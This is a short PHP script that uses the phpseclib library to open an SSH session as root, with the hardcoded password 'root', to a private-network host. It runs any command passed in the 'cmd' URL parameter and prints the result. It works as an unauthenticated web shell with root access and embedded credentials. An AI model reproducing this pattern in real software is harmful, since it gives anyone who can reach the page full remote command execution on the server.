<?php
set_include_path(get_include_path().PATH_SEPARATOR .'../phpseclib');

include 'Net/SSH2.php';

$cmd = $_GET['cmd'];

$ssh = new Net_SSH2('172.31.96.1',2222);
if(!$ssh->login('root', 'root')){
    exit('login Failed');
}

echo $ssh->exec($cmd);